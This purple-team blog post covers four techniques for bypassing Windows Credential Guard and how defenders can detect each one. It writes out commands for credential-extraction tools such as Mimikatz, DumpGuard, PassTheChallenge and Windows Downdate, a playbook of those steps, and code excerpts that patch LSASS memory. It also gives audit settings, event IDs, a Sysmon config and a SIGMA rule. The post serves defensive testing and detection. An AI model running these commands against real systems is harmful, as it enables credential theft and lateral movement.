# https://ipurple.team/2026/03/17/credential-guard/

[Skip to content](https://ipurple.team/2026/03/17/credential-guard/#wp--skip-link--target)

[Purple Team](https://ipurple.team/category/purple-team/)

## Credential Guard

Published by

Administrator

on

[March 17, 2026](https://ipurple.team/2026/03/17/credential-guard/)

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard.png?w=1024)

Microsoft introduced Credential Guard in Windows 10 (2015) and Windows Server 2016 to prevent credential harvesting from the LSASS process that was abused for years by threat actors. Microsoft used Virtualization Based Security (VBS) to isolate and protect credentials from the rest of the operating system. Credential material is stored in a protected environment to prevent theft techniques such as LSASS dumping and to restrict lateral movement, particularly in enterprise environments where privileged accounts are frequent targets. Starting from Windows 11 22H2 and Windows Server 2025, Microsoft enabled credential guard by default if hardware requirements are met.

Credential Guard is a key control in the Microsoft ecosystem due to the sensitive secrets it protects. Offensive security research has pushed the barrier and since 2020 four different techniques related to Credential Guard have been disclosed in the public domain. Some ransomware threat actors such as Akira and Qlin, have used in their campaigns one of these techniques to re-enable the credential storage in the memory of the LSASS process. However, these cases are limited and might not be as widely recognized as other techniques. As a result, they can easily beneath the radar of cyber defence teams or de-prioritized by detection engineering teams.

## Playbook

Mature organizations are running control validation programmes, but their scope includes mostly 3rd party controls and not controls that are embedded within the operating system. It is recommended to expand the scope to other controls to correctly articulate the risk. Various techniques have been disclosed in the public domain associated with abuse of Credential Guard. Some techniques share similarities; thus, the credential guard playbook includes four main techniques. These techniques are related to:

1. Patching
2. Pass the Challenge
3. Downgrade
4. SSP Negotiation

The diagram below visualizes the timeline of Credential Guard attack vectors:

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-timeline.jpg?w=1024)_Credential Guard – Attack Vectors Timeline_

Microsoft have mitigated the Patching and Downgrade techniques. However, the Pass the Challenge and SSP Negotiation still remain unresolved. Purple team operations should cover all applicable techniques to ensure adequate alerting coverage allowing organizations to detect and respond effectively.

### Patching

Once Credential Guard is enabled, two processes relate to LSASS: _LSASS.exe_ and _LsaIso.exe_. The process _LsaIso_ is running inside a Hyper-V virtual machine and accessing the sensitive information stored on this process requires breaking the Hypervisor. The diagram below visualizes the high-level architecture differences between these two processes:

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-virtualized-based-security.jpg?w=1024)_Virtualization-Based Security_

Back in 2020, Team Hydra released an evasion technique related to Credential Guard that attempts to patch global state variables of the _wdigest.dll_ in order to re-enable the caching of credential in LSASS. Specifically, the module _wdigest.dll_ that is loaded by the LSASS process maintains several global state variables that influence how authentication is handled. Two are considered the most important because they directly control whether WDigest stores or returns clear-text credentials. These are:

1. g\_IsCredGuardEnabled
2. g\_fParameter\_UseLogonCredential

The _g\_IsCredGuardEnabled_ variable tracks whether Credential Guard is enabled or not on the system. If _g\_IsCredGuardEnabled == True_, WDigest doesn’t store clear-text passwords in LSASS memory. The _g\_fParameter\_UseLogonCredential_ controls whether WDigest should cache the user’s clear-text password after interactive logon. When the _g\_fParameter\_UseLogonCredential == True_, WDigest stores the user’s plain-text password in LSASS memory, and the password can be recovered via SSP calls. If the value is set to _FALSE_, WDigest doesn’t store plain-text credentials and only hashes and tokens remain in memory. The key below controls the state of the variable:

```
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
```

The table below shows when credentials are stored or not stored in LSASS:

| Action | g\_IsCredGuardEnabled | g\_fParameter\_UseLogonCredential | Result |
| --- | --- | --- | --- |
| WDigest Enabled | FALSE | TRUE | Creds Stored |
| Credential Guard Enabled | TRUE | ANY | Creds not Stored |

Tampering the values of these variables, a threat actor could trick the _WDigest_ module to store the clear-text value of the password in memory on the next user authentication. An offensive security [researcher](https://x.com/wh0amitz) has released a proof of concept called [BypassCredGuard](https://github.com/wh0amitz/BypassCredGuard) that implements this method and could be used to simulate the technique:

```
BypassCredGuard.exe
```

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-bypasscredguard.png?w=931)_BypassCredGuard_

Execution of Mimikatz will verify that credentials are cached in WDigest.

```
mimikatz.exe "privilege::debug" "sekurlsa::wdigest" exit
```

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-mimikatz-wdigest.png?w=840)_Mimikatz – WDigest_

### Pass the Challenge

The _LsaIso_ process exposes cryptographic methods back to the LSASS, such as the _NtlmIumCalculateNtResponse_. Threat actors could abuse _LsaIso_ functions to compute a challenge-response and attempt to crack offline the weak NTLMv1 response, to recover the original NTLM hash. The implementation of the technique has multiple steps and requires an LSASS dump to retrieve the context handle, the proxy info and the encrypted blob. Additionally, a custom Security Support Provider (SSP) needs to be injected into the LSASS process. However, due to these actions, this technique is considered extremely noisy and highly unlikely to be executed by sophisticated adversaries.

[Oliver Lyak](https://x.com/ly4k_) released a proof of concept called [PassTheChallenge](https://github.com/ly4k/PassTheChallenge/) that implements two methods of recovering NTLM hashes from Credential Guard. The first method requires the context handle, the proxy info and the encrypted blob:

```
.\PassTheChallenge.exe nthash <context-handle:proxy-info> <Encrypted-blob>
```

The second method utilizes the following _LsaIso_ method:

- NtlmIumLm20GetNtlm3ChallengeResponse

Using this method the challenge is displayed in the console and a response is required in the modified version of [Impacket](https://github.com/ly4k/Impacket) to conduct the authentication. The password should be set to “ _CHALLENGE_” to coerce Impacket to print the challenge:

```
python3 examples\psexec.py 'purple/Administrator:CHALLENGE@dc'
```

Using the challenge argument in the _PassTheChallenge_ proof of concept and appending the challenge that was retrieved in the previous step, a response will be obtained that could be sent again back to _PsExec_ to conduct the authentication and access the asset.

```
.\PassTheChallenge.exe challenge <context-handle:proxy-info> <Encrypted-blob> <challenge>
```

Full details about these two methods can be found in the article [Pass the Challenge: Defeating Windows Defender Credential Guard](https://research.ifcr.dk/pass-the-challenge-defeating-windows-defender-credential-guard-31a892eee22).

### Downgrade

Credential Guard is implemented in Ring3-VTL1 (Virtual Trust Level) as an isolated user-mode process named _LsaIso.exe_. Secrets are no longer stored in the LSASS process but in the LsaIso with the LSASS process to store only the encrypted blobs of the secrets. [Alon Leviev](https://x.com/alon_leviev) released a tool called [Windows Downdate](https://github.com/SafeBreach-Labs/WindowsDowndate) that can remove specific patches to expose the asset to past vulnerabilities. Execution of the proof of concept will downgrade the patch _CVE-2022-34709_ to enable elevation of privileges from _Ring3-VTL0_ to _Ring3-VTL1_.

```
windows_downdate.exe --config-xml examples/CVE-2022-34709-Credential-Guard-EoP-Patch-Downgrade/Config.xml
```

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-downdate.png?w=1024)_Windows Downdate_

The technique was executed on Windows 11 21H2 (22000.2777) and was added to supplement other attacks that target Credential Guard. Microsoft has released patches and newer Windows 11 versions are no longer vulnerable.

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-downdate-access-denied.png?w=987)_Windows Downdate – Access Denied_

### SSP Negotiation

The Kerberos protocol requires service principal names for authentication. Machine accounts by default have SPNs configured. In default state of Windows, users are allowed to create up to ten machine accounts per host. Execution of the following command creates a new machine account named _iPurple_ on the asset:

|     |
| --- |
| `New-MachineAccount``-MachineAccount``iPurple``-Password``(``ConvertTo-SecureString``Password123``-AsPlainText``-Force``)` |

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-add-machine-account.png?w=1024)_Add Machine Account_

[Valdemar Carøe](https://x.com/bytewreck) performed extensive research on Credential Guard and released a proof of concept called [DumpGuard](https://github.com/bytewreck/DumpGuard) that simulates the SSP negotiation authentication flow to perform extraction of NTLMv1 hashes via the Remote Credential Guard protocol. Execution of the following command will simulate the SSP negotiation to obtain the NTLMv1 response to the _1122334455667788_ challenge for the current user.

```
DumpGuard.exe /mode:self /domain:purple.lab /username:iPurple$ /password:Password123
```

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-dumpguard-mode-self.png?w=975)_DumpGuard – Mode Self_

The technique doesn’t require elevated privileges and could be executed under the context of a standard user. In the event that a threat actor has established elevated access (SYSTEM), the technique could be extended to obtain credentials from all authenticated users on the asset. During purple team operations, it is possible to simulate SYSTEM-level privileges by executing _PsExec_ from SysInternals with the following arguments:

```
PsExec.exe -s -i cmd.exe
```

The mode _all_ can be used to retrieve NTLMv1 hashes from all users on the host:

```
DumpGuard.exe /mode:all /domain:purple.lab /username:iPurple$ /password:Password123 /spn:HOST/iPurple
```

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-dumpguard-mode-all.png?w=997)_DumpGuard – Mode All_

NTLMv1 hashes are considered weak as it is computationally feasible to recover the plain-text value. Threat actors could also utilize the hash to conduct lateral movement via the Pass-the-Hash technique or request Ticket Granting Tickets and Service Tickets (NT Hash).

There is also a beacon object file implementation of _DumpGuard_ that can be executed via Command-and-Control frameworks that support BoF execution. It should be noted that the current state of the beacon object file runs successfully only on Windows Server environments.

```
inline-execute /home/kali/dumpguard.x64.o x purple.lab iPurple$ Password123 host/iPurple.purple.lab
```

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-bof-execution.png?w=1024)_Beacon Object File Execution_![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-ntlmv1-hash-bof.png?w=1024)_NTLMv1 Hash_

The diagram below visualizes the attack flow for obtaining NTLMv1 hashes via Credential Guard interfaces:

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-diagram-2.jpg?w=1024)_SSP Negotiation – Diagram_

The playbook that contains all the techniques associated with Credential Guard can be found below:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62 | `[``[``Playbook.CredentialGuard``]``]`<br>`id =``"1.0.0"`<br>`name =``"1.0.0 - SSP Negotiation"`<br>`description =``"NTLMv1 Hash extraction via Remote Credential Guard"`<br>`tooling.name =``"DumpGuard"`<br>`tooling.references =``[`<br>```"https://github.com/bytewreck/DumpGuard"`<br>`]`<br>`executionSteps =``[`<br>```"DumpGuard.exe /mode:self /domain:<domain-name> /username:<machine-account> /password:<password>"``,`<br>```"DumpGuard.exe /mode:all /domain:<domain-name> /username:<machine-account> /password:<password> /spn:HOST/<Account>"``,`<br>```"inline-execute /home/kali/dumpguard.x64.o x <machine-account> <password> host/<SPN.domain-name>"`<br>`]`<br>`executionRequirements =``[`<br>```"Standard User or Local Administrator"`<br>`]`<br>`[``[``Playbook.CredentialGuard``]``]`<br>`id =``"1.1.0"`<br>`name =``"1.1.0 - Downgrade"`<br>`description =``"Downgrade a Credential Guard patch to elevate privileges"`<br>`tooling.name =``"Windows Downdate"`<br>`tooling.references =``[`<br>```"https://github.com/SafeBreach-Labs/WindowsDowndate"`<br>`]`<br>`executionSteps =``[`<br>```"windows_downdate.exe --config-xml examples/CVE-2022-34709-Credential-Guard-EoP-Patch-Downgrade/Config.xml"`<br>`]`<br>`executionRequirements =``[`<br>```"Local Administrator"`<br>`]`<br>`[``[``Playbook.CredentialGuard``]``]`<br>`id =``"1.2.0"`<br>`name =``"1.2.0 - Pass the Challenge"`<br>`description =``"Compute Challenge-Response to retrieve NTLMv1 Hashes"`<br>`tooling.name =``"PassTheChallenge"`<br>`tooling.references =``[`<br>```"https://github.com/ly4k/PassTheChallenge/"`<br>`]`<br>`executionSteps =``[`<br>```".\PassTheChallenge.exe nthash <context-handle:proxy-info> <Encrypted-blob>"``,`<br>```".\PassTheChallenge.exe challenge <context-handle:proxy-info> <Encrypted-blob> <challenge>"`<br>`]`<br>`executionRequirements =``[`<br>```"Local Administrator"`<br>`]`<br>`[``[``Playbook.CredentialGuard``]``]`<br>`id =``"1.3.0"`<br>`name =``"1.3.0 - Patching"`<br>`description =``"Re-Enable WDigest via memory patching of variables"`<br>`tooling.name =``"BypassCredGuard"`<br>`tooling.references =``[`<br>```"https://github.com/wh0amitz/BypassCredGuard"`<br>`]`<br>`executionSteps =``[`<br>```"BypassCredGuard.exe"`<br>`]`<br>`executionRequirements =``[`<br>```"Local Administrator"`<br>`]` |

The technique abstract is displayed below:

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-technique-abstract.jpg?w=1024)_Technique Abstract_

## Detection

Credential Guard is a key control that prevents exposure of credentials via LSASS. Cyber Defence teams must continuously validate their controls effectiveness and develop rules to address any prevention or detection gaps. The publicly disclosed techniques related to Credential Guard are complex and noisy. Mature SOC teams should be able to develop a detection strategy with extensive coverage to these techniques regardless of any EDR limitations at the API level. Log correlation is also necessary for technique attribution because some indicators overlap with those of other techniques.

### Patching

According to the code, the proof of concept _BypassCredGuard_ attempts to obtain the _SeDebugPrivilege_:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32 | `#include "stdafx.h"`<br>`BOOL``EnableDebugPrivilege(``HANDLE``hToken,``LPCWSTR``lpName)`<br>`{`<br>```BOOL``status = FALSE;`<br>```LUID luidValue = { 0 };`<br>```TOKEN_PRIVILEGES tokenPrivileges;`<br>``<br>```// Get the LUID value of the SE_DEBUG_NAME (SeDebugPrivilege) privilege for the local system`<br>```if``(!LookupPrivilegeValueW(NULL, lpName, &luidValue))`<br>```{`<br>```wprintf(``L"[-] LookupPrivilegeValue Error [%u].\n"``, GetLastError());`<br>```return``status;`<br>```}`<br>```// Set escalation information`<br>```tokenPrivileges.PrivilegeCount = 1;`<br>```tokenPrivileges.Privileges[0].Luid = luidValue;`<br>```tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;`<br>```// Elevate Process Token Access`<br>```if``(!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges,``sizeof``(tokenPrivileges), NULL, NULL))`<br>```{`<br>```wprintf(``L"[-] AdjustTokenPrivileges Error [%u].\n"``, GetLastError());`<br>```return``status;`<br>```}`<br>```else`<br>```{`<br>```status = TRUE;`<br>```}`<br>```return``status;`<br>`}` |

SOC teams should enable the Audit Token Adjusted object via Group Policy to enable visibility for processes seeking to obtain the _SeDebugPrivilege_.

```
Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration → System Audit Policies → Detailed Tracking → Audit Token Right Adjustment
```

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-audit-token-right-adjusted.png?w=1024)_Audit Token Right Adjusted_

When the proof of concept is executed the event ID 4703 will be generated in the logs. Cyber Defence teams should engineer detection rules for processes that attempt to obtain this privilege. However, there might be some legitimate cases where this privilege is obtained by trusted Microsoft processes such as Visual Studio remote debugger etc. SOC teams should monitor these events for a period and adjust their rules to exclude legitimate binaries.

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-sedebugprivilege.png?w=1024)_SeDebugPrivilege_

The tool also attempts to open a handle in the LSASS process. The field _GrantedAccess_ has a value of 0x1FFFFF that translates to _PROCESS\_ALL\_ACCESS_. Any process that attempts to obtain a handle with total control over LSASS should be treated as a very high signal. Most modern Endpoint Detection and Response systems should be able to raise an alert when a process attempts to interact with LSASS. Sysmon can capture this activity under event id 10.

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-patching-sysmon-event-id-10.png?w=1024)_LSASS Handle – Sysmon Event ID 10_

#### API

The global variables _g\_fParameter\_UseLogonCredentials_ and _g\_IsCredGuardEnabled_ are patched in memory by using the _WriteProcessMemory_ API. Most mature EDR platforms should flag this API can raise an alert.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17 | `BOOL``PatchMemory()`<br>`{`<br>```BOOL``status = FALSE;`<br>```DWORD``dwCurrent;`<br>```DWORD``UseLogonCredential = 1;`<br>```DWORD``IsCredGuardEnabled = 0;`<br>```status = AcquireLSA();`<br>```if``(status)`<br>```{`<br>```if``(ReadProcessMemory(cLsass.hProcess, g_fParameter_UseLogonCredential, &dwCurrent,``sizeof``(``DWORD``), NULL))`<br>```{`<br>```wprintf(``L"[*] The current value of g_fParameter_UseLogonCredential is %d\n"``, dwCurrent);`<br>```if``(WriteProcessMemory(cLsass.hProcess, g_fParameter_UseLogonCredential, (``PVOID``)&UseLogonCredential,``sizeof``(``DWORD``), NULL))`<br>```{`<br>```wprintf(``L"[*] Patched value of g_fParameter_UseLogonCredential to 1\n"``);`<br>```status = TRUE;` |

### Downgrade

The proof of concept attempts to access and modify the registry key path that controls the Primitive Operations Queue Executor (poqexec.exe) binary. The _poqexec.exe_ is a component servicing utility used during Windows updates.

|     |     |
| --- | --- |
| 1<br>2 | `SIDE_BY_SIDE_CONFIGURATION_REGISTRY_PATH``=``"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SideBySide\\Configuration"`<br>`POQEXEC_PATH``=``"%SystemRoot%\\System32\\poqexec.exe"` |

It is recommended to enable monitoring for this key by adding an entry to the registry container and apply auditing for all domain users.

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\SideBySide\Configuration\PoqexecCmdline
```

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-downgrade-auditing-registry-keys.png?w=1024)_Registry Key Auditing_

Arbitrary processes that attempt to access and modify this registry key should be flagged as suspicious. Multiple events will be generated on the endpoint associated with this behaviour such as 4656, 4657 and 4663.

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-downgrade-handle-to-registry-key-request.png?w=1024)_Handle Request – Registry Key_![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-downgrade-object-access.png?w=1024)_Object Access_

An additional object that is also accessed is the FileMaps that contains mapping metadata for the Windows Component Based Servicing. In this case the file is accessed as it instructs the CBS how to apply updates, rollbacks etc. The key indicator should be the process name that doesn’t belong to a trusted Microsoft binary.

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-downgrade-file-object-access.png?w=1024)_File Object Access_

The proof of concept will modify the registry key to conduct the downgrade attack by invoking the poqexec.exe to execute an arbitrary XML file.

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-downgrade-registry-key-modification.png?w=1024)_Registry Key Modification_

The application also attempts to obtain dangerous privileges to perform the downgrade operation. These privileges include the following:

1. SeDebugPrivilege
2. SeBackupPrivilege
3. SeRestorePrivilege

Processes that obtain these privileges have full system access and can perform read and write operations on any file or registry key. Windows Event ID 4703 records privilege-level changes in processes.

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-downgrade-sedebugprivilege.png?w=1024)_SeDebugPrivilege_![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-downgrade-sebackupprivilege.png?w=1024)_SeBackupPrivilege_![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-downgrade-serestoreprivilege.png?w=991)_SeRestorePrivilege_

The table below summarize the Windows Event ID’s required to detect the Credential Guard downgrade technique.

| Data Source | Event ID | Detects |
| --- | --- | --- |
| Windows Events | 4656 | Object Handle Requests |
| Windows Events | 4663 | Object Access |
| Windows Events | 4657 | Registry Key Modification |
| Windows Events | 4704 | Token Right Adjustments |

### SSP Negotiation

The proof of concept (DumpGuard) abuses the remote credential guard protocol by simulating the terminal services SSP flow. It authenticates toward an SPN enabled account, establishing a security context, then uses that context to directly call the NtlmCalculateNtResponse on the NtlmCredIsoRemote RPC interface. The technique extracts NTLMv1 hashes from logged-in users without touching LSASS, therefore alerts focused towards LSASS abuse will not trigger. Detection engineering teams should build detections across multiple layers, using diverse data sources to identify threat actors employing this technique in their campaigns.

#### Event Logs

A requirement for this technique is that threat actors should add a machine account or compromise an account that has a service principal name. Adding a machine account is trivial, as users can add up to ten machine accounts in the domain by default. It is recommended to apply a policy that will prevent users from adding machine accounts in the domain. Alternatively, it is possible to enable visibility in the domain when a new machine account is created via the Audit Computer Account Management group policy.

```
Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → Account Management → Audit Computer Account Management
```

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-audit-computer-account-management.png?w=1024)_Audit Computer Account Management_

Creation of computer accounts can be captured under Windows Event ID 4741. Defensive teams should correlate this event ID with other indicators and should not rely on detection rules that are focused only on this activity.

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-event-id-4741.png?w=1024)_Event ID 4741_

DumpGuard initiates Kerberos requests to obtain the Ticket Granting Ticket (TGT) and Ticket Granting Service Ticket (TGS) for the machine account. It is therefore critical for organizations to enable monitoring for _Kerberos Authentication Service_ and _Kerberos Service Ticket Operations_. It should be highlighted that these group policy objects are also correlated with Kerberoasting activities.

```
Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → Account Logon → Audit Kerberos Authentication Service
Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → Account Logon → Audit Kerberos Service Ticket Operations
```

![](https://ipurple.team/wp-content/uploads/2026/03/credential-access-audit-kerberos.png?w=1024)_Audit Kerberos_

Executing the technique generates a Kerberos Authentication Ticket (TGT) request logged under Windows Event ID 4768. SOC teams should correlate this event with the account name and raise an alert if the account belongs to a newly created machine account.

![](https://ipurple.team/wp-content/uploads/2026/03/credential-access-kerberos-tgt-ticket-machine-account.png?w=1024)_Kerberos TGT Ticket_

The second Event ID that is going to be generated is a service ticket request from an elevated account towards a machine account. This action should be considered abnormal and suspicious in every Active Directory environment.

![](https://ipurple.team/wp-content/uploads/2026/03/credential-access-kerberos-service-ticket-machine-account.png?w=1024)_Kerberos Service Ticket_

The table below summarizes the Event ID’s required to detect activities performed via DumpGuard:

| Event ID | Detects |
| --- | --- |
| 4741 | Machine Account Creation |
| 4768 | Kerberos Authentication Ticket Request |
| 4769 | Kerberos Service Ticket Request |

#### API

The technique performs an API call to the Local Security Authority (LSA). Defensive teams should ensure their Endpoint Detection and Response deployment performs hooking to the _LsaCallAuthenticationPackage_ API. Specifically, the tool attempts to connect to the Windows LSA and perform a lookup to the authentication package TSSP. Then the _LsaCallAuthenticationPackage_ sends the raw input buffer back to the TSSP package.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18 | `public``bool``CallPackageLayer4(``byte``[] input,``out``byte``[] output)`<br>```{`<br>```output =``null``;`<br>```var``result =``false``;`<br>```if``(Interop.LsaConnectUntrusted(``out``IntPtr LsaHandle) >= 0)`<br>```{`<br>```var``PackageName =``new``LSA_STRING(``"TSSSP"``);`<br>```if``(Interop.LsaLookupAuthenticationPackage(LsaHandle,``ref``PackageName,``out``uint``AuthenticationPackage) >= 0)`<br>```{`<br>```if``(Interop.LsaCallAuthenticationPackage(LsaHandle, AuthenticationPackage, input, input.Length,``out``var``ReturnBuffer,``out``var``ReturnBufferSize,``out``var``ProtocolStatus) >= 0)`<br>```{`<br>```output =``new``byte``[ReturnBufferSize];`<br>```Marshal.Copy(ReturnBuffer, output, 0, ReturnBufferSize);`<br>```result =``true``;` |

| API | Detects |
| --- | --- |
| LsaCallAuthenticationPackage | TSSP Requests to buffer |

#### DLLs

Sysmon extends visibility on endpoints and servers by detecting image load and network connection events. The proof of concept (DumpGuard) attempts to load various system DLLs to initiate NTLM negotiation and Kerberos authentication. Sysmon records image load events as event ID 7. These DLLs are summarized in the table below:

| DLL | Description |
| --- | --- |
| sspicli.dll | NTLM & Kerberos Authentication |
| TSpkg.dll | CredSSP Implementation |
| Kerberos.dll | Kerberos Protocol Implementation |
| DumpGuardLib.dll | ASN.1 Encoding/Decoding Routines |

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-sspicli-dll.png?w=1024)_sspicli.dll_![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-tspkg-dll.png?w=1024)_TSpkg.dll_![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-kerberos-dll.png?w=1024)_Kerberos.dll_

Additionally, DumpGuard requires a library called _DumpGuardLib.dll_ to conduct encoding and decoding routines that enable the tool to interact with Remote Credential Guard (RCG) and NTLMv1 interfaces.

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-dumpguard-dll.png?w=1024)_DumpGuard DLL_

SOC teams could utilize PowerShell to view Sysmon logs by executing the following command:

|     |     |
| --- | --- |
| 1 | `Get-WinEvent``-FilterHashtable``@{LogName=``'Microsoft-Windows-Sysmon/Operational'``; Id=7} |``Select-Object``-First``10 |``Select-Object``-ExpandProperty``Message` |

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-read-sysmon-logs-via-powershell.png?w=958)_Read Sysmon Logs via PowerShell_

Additionally running the following command will improve the formatting of the log output:

|     |     |
| --- | --- |
| 1 | `Get-WinEvent``-FilterHashtable``@{LogName=``'Microsoft-Windows-Sysmon/Operational'``; Id=7} |``Select-Object``-First``10 |``Format-List``TimeCreated, Id, LevelDisplayName, Message` |

![](https://ipurple.team/wp-content/uploads/2026/03/remote-credential-guard-read-sysmon-logs-via-powershell-format.png?w=960)_Read Sysmon Logs via PowerShell_

An arbitrary process loading these three DLLs indicates execution of the technique that retrieves NTLMv1 hashes from Remote Credential Guard. Detection engineering teams should tune their rules to filter legitimate executions. Defensive teams could also use the following Sysmon and SIGMA rules to detect this activitity.

##### Sysmon

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14 | `<``Sysmon``schemaversion``=``"4.90"``>`<br>```<``EventFiltering``>`<br>```<``RuleGroup``name``=``"Suspicious Image Loads"``groupRelation``=``"or"``>`<br>```<``ImageLoad``onmatch``=``"include"``>`<br>```<``ImageLoaded``condition``=``"contains"``>tspkg.dll</``ImageLoaded``>`<br>```<``ImageLoaded``condition``=``"contains"``>sspicli.dll</``ImageLoaded``>`<br>```<``ImageLoaded``condition``=``"contains"``>kerberos.dll</``ImageLoaded``>`<br>```</``ImageLoad``>`<br>```<``ImageLoad``onmatch``=``"exclude"``>`<br>```<``Image``condition``=``"begin with"``>C:\Windows\System32\</``Image``>`<br>```</``ImageLoad``>`<br>```</``RuleGroup``>`<br>```</``EventFiltering``>`<br>`</``Sysmon``>` |

##### SIGMA

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27 | `title:``Suspicious Use of DLL's by Untrusted Processes`<br>`id:``1d1d2a9e-8c9d-4c6f-8d2f-1f6c1cf6d9c4`<br>`status:``experimental`<br>`description:``Detects Terminal Services and Kerberos DLL's loaded into unexpected processes`<br>`references:`<br>```-``https``:``//github.com/bytewreck/DumpGuard`<br>`author:``Panos Gkatziroulis`<br>`date:``2026-03-04`<br>`logsource:`<br>```product:``windows`<br>```category:``image_load`<br>`detection:`<br>```selection:`<br>```EventID:``7`<br>```ImageLoaded|endswith``:``'\tspkg.dll'`<br>```ImageLoaded|endswith``:``'\sspicli.dll'`<br>```ImageLoaded|endswith``:``'\kerberos.dll'`<br>```filter_legit:`<br>```Image|endswith``:`<br>```-``'\mstsc.exe'`<br>```-``'\msrdc.exe'`<br>```-``'\rdpclip.exe'`<br>```-``'\svchost.exe'``# TermService/related hosts in some environments`<br>```condition:``selection and not filter_legit`<br>`falsepositives:`<br>```-``Third-party RDP clients or enterprise remote-assistance tools`<br>```-``Some Citrix/VDI components (environment-specific)` |

#### Process Handle

Another detection opportunity is to monitor for processes that attempt to open a handle in the LSASS process. Both Endpoint Detection and Response systems and Sysmon can detect processes that attempt to open handles to other processes. Specifically, the _GrantedAccess_ field has a value of 0x1F3FFF that translates to _PROCESS\_ALL\_ACCESS_. Requests to the LSASS process with that access mask should be considered malicious and it should be correlated with credential dumping techniques.

![](https://ipurple.team/wp-content/uploads/2026/03/credential-guard-process-handle.png?w=1024)_Process Handle_

Attack vectors associated with Credential Guard have evolved over the years. However, these techniques are considered complex and require multiple steps that could introduce more indicators of compromise on the affected assets. Mature SOC teams that perform log correlation should be able to detect most of these activities. Especially for the SSP Negotiation technique, it is recommended organizations to evaluate with their EDR vendor, if their deployment conducts monitoring on the affected API. Organizations should perform purple team operations to all key controls such as Credential Guard to properly assess risks and engineer detection rules. Since some of these techniques have not properly mitigated by Microsoft as the control owner, cyber defence teams should take appropriate steps to identify gaps and reduce risks.

### Share this:

- [Share on X (Opens in new window)X](https://ipurple.team/2026/03/17/credential-guard/?share=x&nb=1)
- [Email a link to a friend (Opens in new window)Email](mailto:?subject=%5BShared%20Post%5D%20Credential%20Guard&body=https%3A%2F%2Fipurple.team%2F2026%2F03%2F17%2Fcredential-guard%2F&share=email&nb=1)
- [Share on LinkedIn (Opens in new window)LinkedIn](https://ipurple.team/2026/03/17/credential-guard/?share=linkedin&nb=1)
- [Share on Facebook (Opens in new window)Facebook](https://ipurple.team/2026/03/17/credential-guard/?share=facebook&nb=1)
- [Share on Reddit (Opens in new window)Reddit](https://ipurple.team/2026/03/17/credential-guard/?share=reddit&nb=1)
- [Share on Mastodon (Opens in new window)Mastodon](https://ipurple.team/2026/03/17/credential-guard/?share=mastodon&nb=1)
- [More](https://ipurple.team/2026/03/17/credential-guard/#)

- [Share on X (Opens in new window)X](https://ipurple.team/2026/03/17/credential-guard/?share=twitter&nb=1)

LikeLoading…

### Leave a comment [Cancel reply](https://ipurple.team/2026/03/17/credential-guard/\#respond)

Write a comment...

Log in or provide your name and email to leave a comment.

Email me new posts

InstantlyDailyWeekly

Email me new comments

